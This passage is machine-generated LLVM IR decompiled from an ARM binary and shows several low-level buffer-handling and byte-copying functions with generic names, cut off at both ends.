  store i32 %v0_110b8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_110c4 = inttoptr i32 %v0_110b8 to i32*
  store i32 84, i32* %v2_110c4, align 4
  %v0_11130.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11130

dec_label_pc_110cc:                               ; preds = %dec_label_pc_11104
  %v3_11108 = zext i8 %v2_11108 to i32
  store i32 %v3_11108, i32* @lr, align 4
  br label %dec_label_pc_11124

dec_label_pc_110d4:                               ; preds = %dec_label_pc_110a0
  store i32 %v2_110903.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_110dc

dec_label_pc_110dc:                               ; preds = %bb27, %.thread4, %dec_label_pc_110d4
  %v1_110e020 = phi i32 [ %v0_1108c, %bb27 ], [ %v1_110e0.ph, %.thread4 ], [ %v1_110e0.ph, %dec_label_pc_110d4 ]
  %v2_1110414 = phi i32 [ %tmp, %bb27 ], [ %v2_110903.ph, %.thread4 ], [ %v2_110903.ph, %dec_label_pc_110d4 ]
  %v1_110dc = load i32, i32* @r3, align 4
  %v3_110dc = icmp uge i32 %v1_110e020, %v1_110dc
  %v1_110dc.v1_110e020 = select i1 %v3_110dc, i32 %v1_110dc, i32 %v1_110e020
  store i32 %v1_110dc.v1_110e020, i32* %r4.global-to-local, align 4
  %v1_110e8 = inttoptr i32 %arg2 to i32*
  %v2_110e8 = load i32, i32* %v1_110e8, align 4
  store i32 %v2_110e8, i32* @lr, align 4
  store i32 %v1_110dc.v1_110e020, i32* %r0.global-to-local, align 4
  %v2_1111c8 = icmp eq i32 %v1_110dc.v1_110e020, 0
  br i1 %v2_1111c8, label %dec_label_pc_11124, label %dec_label_pc_110f4

dec_label_pc_110f4:                               ; preds = %dec_label_pc_110dc, %dec_label_pc_11114.dec_label_pc_110f4_crit_edge
  %v2_11104 = phi i32 [ %v2_11114, %dec_label_pc_11114.dec_label_pc_110f4_crit_edge ], [ %v2_1110414, %dec_label_pc_110dc ]
  %v0_110fc = phi i32 [ %v0_110f4.pre, %dec_label_pc_11114.dec_label_pc_110f4_crit_edge ], [ %v2_110e8, %dec_label_pc_110dc ]
  %v1_110f4 = inttoptr i32 %v0_110fc to i32*
  %v2_110f4 = load i32, i32* %v1_110f4, align 4
  %v1_110fc = add i32 %v0_110fc, 4
  store i32 %v1_110fc, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_110f4, 127
  br i1 %tmp36, label %dec_label_pc_110b8, label %dec_label_pc_11104

dec_label_pc_11104:                               ; preds = %dec_label_pc_110f4
  %v1_11104 = trunc i32 %v2_110f4 to i8
  %v3_11104 = inttoptr i32 %v2_11104 to i8*
  store i8 %v1_11104, i8* %v3_11104, align 1
  %v0_11108 = load i32, i32* @ip, align 4
  %v1_11108 = inttoptr i32 %v0_11108 to i8*
  %v2_11108 = load i8, i8* %v1_11108, align 1
  %v2_1110c = icmp eq i8 %v2_11108, 0
  br i1 %v2_1110c, label %dec_label_pc_110cc, label %dec_label_pc_11114

dec_label_pc_11114:                               ; preds = %dec_label_pc_11104
  %v1_11114 = load i32, i32* %r2.global-to-local, align 4
  %v2_11114 = add i32 %v1_11114, %v0_11108
  store i32 %v2_11114, i32* @ip, align 4
  %v0_11118 = load i32, i32* %r0.global-to-local, align 4
  %v1_11118 = add i32 %v0_11118, -1
  store i32 %v1_11118, i32* %r0.global-to-local, align 4
  %v2_1111c = icmp eq i32 %v1_11118, 0
  br i1 %v2_1111c, label %dec_label_pc_11124, label %dec_label_pc_11114.dec_label_pc_110f4_crit_edge

dec_label_pc_11114.dec_label_pc_110f4_crit_edge:  ; preds = %dec_label_pc_11114
  %v0_110f4.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_110f4

dec_label_pc_11124:                               ; preds = %dec_label_pc_11114, %dec_label_pc_110dc, %dec_label_pc_110cc
  %v0_11124 = phi i32 [ %v0_11108, %dec_label_pc_110cc ], [ %v2_1110414, %dec_label_pc_110dc ], [ %v2_11114, %dec_label_pc_11114 ]
  %v1_11124 = load i32, i32* @sp, align 4
  %v9_11124 = icmp eq i32 %v0_11124, %v1_11124
  br i1 %v9_11124, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_11124
  %v1_11128 = load i32, i32* @lr, align 4
  store i32 %v1_11128, i32* %v1_110e8, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11124, %bb30
  %v0_1112c = load i32, i32* %r0.global-to-local, align 4
  %v1_1112c = load i32, i32* %r4.global-to-local, align 4
  %v2_1112c = sub i32 %v1_1112c, %v0_1112c
  store i32 %v2_1112c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11130

dec_label_pc_11130:                               ; preds = %dec_label_pc_110b8, %bb31
  %v0_11130 = phi i32 [ %v0_11130.pre, %dec_label_pc_110b8 ], [ %v2_1112c, %bb31 ]
  store i32 %v0_11130, i32* %r0.global-to-local, align 4
  %v2_11138 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11138, i32* %r4.global-to-local, align 4
  ret i32 %v0_11130

; uselistorder directives
  uselistorder i32 %v0_11130, { 1, 0 }
  uselistorder i32 %v1_11118, { 1, 0 }
  uselistorder i32 %v2_11114, { 0, 2, 1 }
  uselistorder i32 %v2_110f4, { 1, 0 }
  uselistorder i32 %v2_1110414, { 1, 0 }
  uselistorder i32 %v1_110e0.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 2, 1, 0 }
  uselistorder i32 127, { 0, 3, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11130, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_110f4, { 1, 0 }
  uselistorder label %dec_label_pc_110dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_110a0, { 1, 0 }
}

define i32 @function_1113c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1113c:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1113c = load i32, i32* @r4, align 4
  store i32 %v3_1113c, i32* %stack_var_-12, align 4
  %v6_1113c = load i32, i32* @r5, align 4
  %v9_1113c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1114c = call i32 @function_10c48(i32 %arg1, i32 3)
  %v7_11150 = icmp eq i32 %v2_1114c, -1
  br i1 %v7_11150, label %dec_label_pc_1113c.dec_label_pc_1116c_crit_edge, label %dec_label_pc_11164

dec_label_pc_1113c.dec_label_pc_1116c_crit_edge:  ; preds = %dec_label_pc_1113c
  br label %dec_label_pc_1116c

dec_label_pc_11164:                               ; preds = %dec_label_pc_1113c
  %v0_11158 = load i32, i32* @r4, align 4
  %v0_11154 = load i32, i32* %r5.global-to-local, align 4
  %v2_11164 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11164, i32* @r4, align 4
  store i32 %v6_1113c, i32* @r5, align 4
  store i32 %v9_1113c, i32* @lr, align 4
  %v4_11168 = inttoptr i32 %v0_11154 to i8*
  %v5_11168 = call i32 @function_d1dc(i32 %v2_1114c, i8* %v4_11168, i32 0, i32 %v0_11158)
  br label %dec_label_pc_1116c

dec_label_pc_1116c:                               ; preds = %dec_label_pc_1113c.dec_label_pc_1116c_crit_edge, %dec_label_pc_11164
  %v2_11170 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11170, i32* @r4, align 4
  store i32 %v6_1113c, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1114c, { 1, 0 }
  uselistorder i32 %v6_1113c, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10c48, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1116c, { 1, 0 }
}

define i32 @function_11174(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11174:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_111882 = icmp eq i32 %arg3, 0
  store i1 %v2_111882, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_111882, label %dec_label_pc_11228, label %dec_label_pc_11194

dec_label_pc_11188thread-pre-split:               ; preds = %bb22
  %v3_111ac = load i32, i32* %r7.global-to-local, align 4
  %v5_111ac = add i32 %v3_111ac, %v4_111a0
  store i32 %v5_111ac, i32* %r7.global-to-local, align 4
  %v5_111b0 = sub i32 %v0_111a8, %v4_111a0
  store i32 %v5_111b0, i32* %r5.global-to-local, align 4
  %v2_11188 = icmp eq i32 %v5_111b0, 0
  store i1 %v2_11188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_111b0, i32* @r2, align 4
  br i1 %v2_11188, label %dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %dec_label_pc_11174, %dec_label_pc_11188thread-pre-split
  %v0_11198 = phi i32 [ %v5_111ac, %dec_label_pc_11188thread-pre-split ], [ %arg2, %dec_label_pc_11174 ]
  %v0_11194.in = phi i32 [ %v5_111b0, %dec_label_pc_11188thread-pre-split ], [ %arg3, %dec_label_pc_11174 ]
  %v0_11194 = icmp slt i32 %v0_11194.in, 0
  br i1 %v0_11194, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_11194
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_11194, %bb
  %v0_1119c = load i32, i32* @r4, align 4
  %v1_1119c = add i32 %v0_1119c, 4
  %v2_1119c = inttoptr i32 %v1_1119c to i32*
  %v3_1119c = load i32, i32* %v2_1119c, align 4
  store i32 %v3_1119c, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_11198 to i32*
  %v4_111a0 = call i32 @function_cba8(i32 %v3_1119c, i32* %tmp23)
  store i32 %v4_111a0, i32* %r0.global-to-local, align 4
  %v1_111a4 = icmp slt i32 %v4_111a0, 0
  %v2_111a4 = icmp eq i32 %v4_111a0, 0
  store i1 %v2_111a4, i1* %cpsr_z.global-to-local, align 1
  %v0_111a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_111a8, i32* %r6.global-to-local, align 4
  br i1 %v1_111a4, label %dec_label_pc_111b8, label %dec_label_pc_11188thread-pre-split

dec_label_pc_111b8:                               ; preds = %bb22
  %v0_111b8 = load i32, i32* @r4, align 4
  %v1_111b8 = inttoptr i32 %v0_111b8 to i32*
  %v2_111b8 = load i32, i32* %v1_111b8, align 4
  store i32 %v2_111b8, i32* %r3.global-to-local, align 4
  %v1_111bc = add i32 %v0_111b8, 8
  store i32 %v1_111bc, i32* %r0.global-to-local, align 4
  %v1_111c0 = inttoptr i32 %v1_111bc to i32*
  %v2_111c0 = load i32, i32* %v1_111c0, align 4
  store i32 %v2_111c0, i32* %r0.global-to-local, align 4
  %v3_111c0 = add i32 %v0_111b8, 12
  %v4_111c0 = inttoptr i32 %v3_111c0 to i32*
  %v5_111c0 = load i32, i32* %v4_111c0, align 4
  %v1_111c4 = or i32 %v2_111b8, 8
  store i32 %v1_111c4, i32* %r3.global-to-local, align 4
  %v3_111c8 = sdiv i32 %v2_111b8, 256
  %v2_111cc = sub i32 %v5_111c0, %v2_111c0
  store i32 %v2_111cc, i32* %r2.global-to-local, align 4
  %v9_111cc = icmp eq i32 %v5_111c0, %v2_111c0
  store i1 %v9_111cc, i1* %cpsr_z.global-to-local, align 1
  %v1_111d0 = trunc i32 %v3_111c8 to i8
  %v3_111d0 = add i32 %v0_111b8, 1
  %v4_111d0 = inttoptr i32 %v3_111d0 to i8*
  store i8 %v1_111d0, i8* %v4_111d0, align 1
  %v0_111d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_111d4 = trunc i32 %v0_111d4 to i8
  %v2_111d4 = load i32, i32* @r4, align 4
  %v3_111d4 = inttoptr i32 %v2_111d4 to i8*
  store i8 %v1_111d4, i8* %v3_111d4, align 1
  %v0_111d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_111d8, label %dec_label_pc_111b8.dec_label_pc_11224_crit_edge, label %dec_label_pc_111dc

dec_label_pc_111b8.dec_label_pc_11224_crit_edge:  ; preds = %dec_label_pc_111b8
  %v0_11224.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11224

dec_label_pc_111dc:                               ; preds = %dec_label_pc_111b8
  %v0_111dc = load i32, i32* %r2.global-to-local, align 4
  %v1_111dc = load i32, i32* %r5.global-to-local, align 4
  %v9_111dc = icmp eq i32 %v0_111dc, %v1_111dc
  store i1 %v9_111dc, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_111dc, %v1_111dc
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_111dc
  store i32 %v0_111dc, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_111dc, %bb24
  %v0_111e4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_111e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_11208
  %v2_111e8 = phi i32 [ %v2_111e8.pre, %.preheader ], [ %v1_1120c, %dec_label_pc_11208 ]
  %v0_111e4 = phi i32 [ %v0_111e4.pre, %.preheader ], [ %v1_111f4, %dec_label_pc_11208 ]
  %v1_111e4 = inttoptr i32 %v0_111e4 to i8*
  %v2_111e4 = load i8, i8* %v1_111e4, align 1
  %v3_111e4 = zext i8 %v2_111e4 to i32
  store i32 %v3_111e4, i32* %r3.global-to-local, align 4
  %v3_111e8 = inttoptr i32 %v2_111e8 to i8*
  store i8 %v2_111e4, i8* %v3_111e8, align 1
  %v0_111ec = load i32, i32* %r0.global-to-local, align 4
  %v1_111ec = inttoptr i32 %v0_111ec to i8*
  %v2_111ec = load i8, i8* %v1_111ec, align 1
  %v3_111ec = zext i8 %v2_111ec to i32
  store i32 %v3_111ec, i32* %r3.global-to-local, align 4
  %v7_111f0 = icmp eq i8 %v2_111ec, 10
  store i1 %v7_111f0, i1* %cpsr_z.global-to-local, align 1
  %v0_111f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_111f4 = add i32 %v0_111f4, 1
  store i32 %v1_111f4, i32* %r7.global-to-local, align 4
  br i1 %v7_111f0, label %dec_label_pc_111fc, label %dec_label_pc_11208

dec_label_pc_111fc:                               ; preds = %bb25
  %v0_111fc = load i32, i32* @r4, align 4
  %v1_111fc = add i32 %v0_111fc, 1
  %v2_111fc = inttoptr i32 %v1_111fc to i8*
  %v3_111fc = load i8, i8* %v2_111fc, align 1
  %v4_111fc = zext i8 %v3_111fc to i32
  store i32 %v4_111fc, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_111fc, 2
  %v2_11200 = icmp eq i8 %tmp30, 0
  store i1 %v2_11200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11200, label %dec_label_pc_11208, label %dec_label_pc_11214

dec_label_pc_11208:                               ; preds = %dec_label_pc_111fc, %bb25
  %v0_11208 = load i32, i32* %r6.global-to-local, align 4
  %v1_11208 = add i32 %v0_11208, -1
  store i32 %v1_11208, i32* %r6.global-to-local, align 4
  %v7_11208 = icmp eq i32 %v0_11208, 1
  store i1 %v7_11208, i1* %cpsr_z.global-to-local, align 1
  %v1_1120c = add i32 %v0_111ec, 1
  store i32 %v1_1120c, i32* %r0.global-to-local, align 4
  br i1 %v7_11208, label %dec_label_pc_11208.dec_label_pc_11214_crit_edge, label %bb25

dec_label_pc_11208.dec_label_pc_11214_crit_edge:  ; preds = %dec_label_pc_11208
  %v0_11214.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %dec_label_pc_111fc, %dec_label_pc_11208.dec_label_pc_11214_crit_edge
  %v0_11218 = phi i32 [ %v1_1120c, %dec_label_pc_11208.dec_label_pc_11214_crit_edge ], [ %v0_111ec, %dec_label_pc_111fc ]
  %v0_11214 = phi i32 [ %v0_11214.pre, %dec_label_pc_11208.dec_label_pc_11214_crit_edge ], [ %v0_111fc, %dec_label_pc_111fc ]
  %v1_11214 = add i32 %v0_11214, 8
  %v2_11214 = inttoptr i32 %v1_11214 to i32*
  %v3_11214 = load i32, i32* %v2_11214, align 4
  store i32 %v3_11214, i32* %r3.global-to-local, align 4
  %v2_11218 = add i32 %v0_11214, 16
  %v3_11218 = inttoptr i32 %v2_11218 to i32*
  store i32 %v0_11218, i32* %v3_11218, align 4
  %v0_1121c = load i32, i32* %r3.global-to-local, align 4
  %v1_1121c = load i32, i32* %r0.global-to-local, align 4
  %v2_1121c = sub i32 %v1_1121c, %v0_1121c
  store i32 %v2_1121c, i32* %r3.global-to-local, align 4
  %v1_11220 = load i32, i32* %r5.global-to-local, align 4
  %v2_11220 = sub i32 %v1_11220, %v2_1121c
  store i32 %v2_11220, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_111b8.dec_label_pc_11224_crit_edge, %dec_label_pc_11214
  %v0_11224 = phi i32 [ %v0_11224.pre, %dec_label_pc_111b8.dec_label_pc_11224_crit_edge ], [ %v2_11220, %dec_label_pc_11214 ]
  %v1_11224 = load i32, i32* %r8.global-to-local, align 4
  %v2_11224 = sub i32 %v1_11224, %v0_11224
  store i32 %v2_11224, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11228

dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge: ; preds = %dec_label_pc_11188thread-pre-split
  %v0_11228.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11228

dec_label_pc_11228:                               ; preds = %dec_label_pc_11174, %dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge, %dec_label_pc_11224
  %v0_11228 = phi i32 [ %v2_11224, %dec_label_pc_11224 ], [ %v0_11228.pre.pre, %dec_label_pc_11188.dec_label_pc_11228.loopexit_crit_edge ], [ 0, %dec_label_pc_11174 ]
  store i32 %v0_11228, i32* %r0.global-to-local, align 4
  ret i32 %v0_11228

; uselistorder directives
  uselistorder i32 %v0_11228, { 1, 0 }
  uselistorder i32 %v0_11214, { 1, 0 }
  uselistorder i32 %v1_1120c, { 0, 2, 1 }
  uselistorder i32 %v0_11208, { 1, 0 }
  uselistorder i1 %v2_11200, { 1, 0 }
  uselistorder i32 %v1_111f4, { 1, 0 }
  uselistorder i32 %v0_111dc, { 1, 0, 2 }
  uselistorder i32 %v5_111c0, { 1, 0 }
  uselistorder i32 %v2_111c0, { 1, 0, 2 }
  uselistorder i32 %v0_111a8, { 1, 0 }
  uselistorder i32 %v4_111a0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_111b0, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32*)* @function_cba8, { 1, 0 }
  uselistorder label %dec_label_pc_11228, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11224, { 1, 0 }
  uselistorder label %dec_label_pc_11214, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_11194, { 1, 0 }
}

define i32 @function_11230(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11230:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11230 = load i32, i32* @r4, align 4
  store i32 %v3_11230, i32* %stack_var_-20, align 4
  %v6_11230 = load i32, i32* @r5, align 4
  %v9_11230 = load i32, i32* @r6, align 4
  %v12_11230 = load i32, i32* @r7, align 4
  %v15_11230 = load i32, i32* @lr, align 4
  %v1_11234 = add i32 %arg3, 1
  %v2_11234 = inttoptr i32 %v1_11234 to i8*
  %v3_11234 = load i8, i8* %v2_11234, align 1
  %v4_11234 = zext i8 %v3_11234 to i32
  %v3_11238 = mul nuw nsw i32 %v4_11234, 256
  %v1_1123c = and i32 %v3_11238, 512
  store i32 %v1_1123c, i32* @r4, align 4
  %v2_1123c = icmp eq i32 %v1_1123c, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1123c, label %dec_label_pc_11250, label %dec_label_pc_1134c

dec_label_pc_11250:                               ; preds = %dec_label_pc_11230
  %v1_11250 = add i32 %arg3, 4
  %v2_11250 = inttoptr i32 %v1_11250 to i32*
  %v3_11250 = load i32, i32* %v2_11250, align 4
  %v1_11258 = add i32 %arg3, 16
  %v2_11258 = inttoptr i32 %v1_11258 to i32*
  %v3_11258 = load i32, i32* %v2_11258, align 4
  store i32 %v3_11258, i32* @r0, align 4
  %v1_1125c = add i32 %arg3, 12
  %v2_1125c = inttoptr i32 %v1_1125c to i32*
  %v3_1125c = load i32, i32* %v2_1125c, align 4
  %v4_11260 = icmp eq i32 %v3_11250, -2
  %v2_11264 = sub i32 %v3_1125c, %v3_11258
  br i1 %v4_11260, label %dec_label_pc_11264, label %dec_label_pc_1128c

dec_label_pc_11264:                               ; preds = %dec_label_pc_11250
  %v3_11268 = icmp ugt i32 %v2_11264, %arg2
  br i1 %v3_11268, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_11264
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_11264, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_11264, %dec_label_pc_11264 ]
  %v0_11270 = phi i32 [ %arg2, %bb ], [ %v2_11264, %dec_label_pc_11264 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_11270, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_11278 = call i32 @function_ec10()
  %v0_1127c = load i32, i32* @r5, align 4
  %v1_1127c = add i32 %v0_1127c, 16
  %v2_1127c = inttoptr i32 %v1_1127c to i32*
  %v3_1127c = load i32, i32* %v2_1127c, align 4
  %v1_11280 = load i32, i32* @r4, align 4
  %v2_11280 = add i32 %v1_11280, %v3_1127c
  store i32 %v2_11280, i32* %v2_1127c, align 4
  br label %dec_label_pc_11360

dec_label_pc_1128c:                               ; preds = %dec_label_pc_11250
  %tmp = icmp ult i32 %v2_11264, %arg2
  br i1 %tmp, label %dec_label_pc_1132c, label %dec_label_pc_11298

dec_label_pc_11298:                               ; preds = %dec_label_pc_1128c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_112a0 = call i32 @function_ec10()
  %v0_112a4 = load i32, i32* @r5, align 4
  %v1_112a4 = add i32 %v0_112a4, 16
  %v2_112a4 = inttoptr i32 %v1_112a4 to i32*
  %v3_112a4 = load i32, i32* %v2_112a4, align 4
  %v1_112a8 = add i32 %v0_112a4, 1
  %v2_112a8 = inttoptr i32 %v1_112a8 to i8*
  %v3_112a8 = load i8, i8* %v2_112a8, align 1
  %v1_112ac = load i32, i32* @r6, align 4
  %v2_112ac = add i32 %v1_112ac, %v3_112a4
  %tmp17 = urem i8 %v3_112a8, 2
  %v2_112b0 = icmp eq i8 %tmp17, 0
  store i32 %v2_112ac, i32* %v2_112a4, align 4
  br i1 %v2_112b0, label %dec_label_pc_11360, label %dec_label_pc_112bc

dec_label_pc_112bc:                               ; preds = %dec_label_pc_11298
  %v0_112bc = load i32, i32* %r7.global-to-local, align 4
  %v0_112c4 = load i32, i32* @r6, align 4
  %v4_112c8 = call i32 @function_12544(i32 %v0_112bc, i32 10, i32 %v0_112c4, i32 %v2_112ac)
  %v2_112cc = icmp eq i32 %v4_112c8, 0
  br i1 %v2_112cc, label %dec_label_pc_11360, label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_112bc
  %v0_112d4 = load i32, i32* @r5, align 4
  store i32 %v0_112d4, i32* @r0, align 4
  %v0_112d8 = call i32 @function_d60c()
  %v2_112dc = icmp eq i32 %v0_112d8, 0
  br i1 %v2_112dc, label %dec_label_pc_11360, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112d4
  %v0_112e4 = load i32, i32* @r6, align 4
  %v3_112e4 = icmp uge i32 %v0_112e4, %v0_112d8
  %v0_112d8.v0_112e4 = select i1 %v3_112e4, i32 %v0_112d8, i32 %v0_112e4
  store i32 %v0_112d8.v0_112e4, i32* @r4, align 4
  %v2_112f0 = sub i32 %v0_112e4, %v0_112d8.v0_112e4
  %v0_112f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_112f4 = add i32 %v0_112f4, %v2_112f0
  store i32 %v2_112f4, i32* %r7.global-to-local, align 4
  store i32 %v0_112d8.v0_112e4, i32* @r2, align 4
  %v4_11304 = call i32 @function_12430(i32 %v2_112f4, i32 10, i32 %v0_112d8.v0_112e4, i32 %v2_112f0)
  %v2_11308 = icmp eq i32 %v4_11304, 0
  br i1 %v2_11308, label %dec_label_pc_11360, label %dec_label_pc_11310

dec_label_pc_11310:                               ; preds = %dec_label_pc_112e4
  %v0_11310 = load i32, i32* @r5, align 4
  %v1_11310 = add i32 %v0_11310, 16
  %v2_11310 = inttoptr i32 %v1_11310 to i32*
  %v3_11310 = load i32, i32* %v2_11310, align 4
  %v0_11314 = load i32, i32* %r7.global-to-local, align 4
  %v1_11314 = load i32, i32* @r4, align 4
  %v2_11314 = sub i32 %v0_11314, %v4_11304
  %v2_11318 = add i32 %v2_11314, %v1_11314
  %v2_1131c = sub i32 %v3_11310, %v2_11318
  %v1_11320 = load i32, i32* @r6, align 4
  %v2_11320 = sub i32 %v1_11320, %v2_11318
  store i32 %v2_11320, i32* @r6, align 4
  store i32 %v2_1131c, i32* %v2_11310, align 4
  br label %dec_label_pc_11360

dec_label_pc_1132c:                               ; preds = %dec_label_pc_1128c
  %v1_1132c = add i32 %arg3, 8
  %v2_1132c = inttoptr i32 %v1_1132c to i32*
  %v3_1132c = load i32, i32* %v2_1132c, align 4
  %v9_11330 = icmp eq i32 %v3_11258, %v3_1132c
  br i1 %v9_11330, label %dec_label_pc_1134c, label %dec_label_pc_11338

dec_label_pc_11338:                               ; preds = %dec_label_pc_1132c
  store i32 %arg3, i32* @r0, align 4
  %v0_1133c = call i32 @function_d60c()
  %v2_11340 = icmp eq i32 %v0_1133c, 0
  br i1 %v2_11340, label %dec_label_pc_11338.dec_label_pc_1134c_crit_edge, label %bb13

dec_label_pc_11338.dec_label_pc_1134c_crit_edge:  ; preds = %dec_label_pc_11338
  %v0_11354.pre = load i32, i32* @r6, align 4
  %v0_1134c.pre = load i32, i32* @r5, align 4
  %v0_11350.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_11358.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_1134c

bb13:                                             ; preds = %dec_label_pc_11338
  %v1_11344 = load i32, i32* @r4, align 4
  store i32 %v1_11344, i32* @r6, align 4
  br label %dec_label_pc_11360

dec_label_pc_1134c:                               ; preds = %dec_label_pc_11338.dec_label_pc_1134c_crit_edge, %dec_label_pc_11230, %dec_label_pc_1132c
  %v2_11358 = phi i32 [ %v2_11358.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %v3_11230, %dec_label_pc_11230 ], [ %v3_11230, %dec_label_pc_1132c ]
  %v0_11350 = phi i32 [ %v0_11350.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %arg1, %dec_label_pc_11230 ], [ %arg1, %dec_label_pc_1132c ]
  %v0_1134c = phi i32 [ %v0_1134c.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %arg3, %dec_label_pc_11230 ], [ %arg3, %dec_label_pc_1132c ]
  %v0_11354 = phi i32 [ %v0_11354.pre, %dec_label_pc_11338.dec_label_pc_1134c_crit_edge ], [ %arg2, %dec_label_pc_11230 ], [ %arg2, %dec_label_pc_1132c ]
  store i32 %v2_11358, i32* @r4, align 4
  store i32 %v9_11230, i32* @r6, align 4
  store i32 %v15_11230, i32* @lr, align 4
  %v3_1135c = inttoptr i32 %v0_1134c to i8*
  %v4_1135c = call i32 @function_11174(i8* %v3_1135c, i32 %v0_11350, i32 %v0_11354)
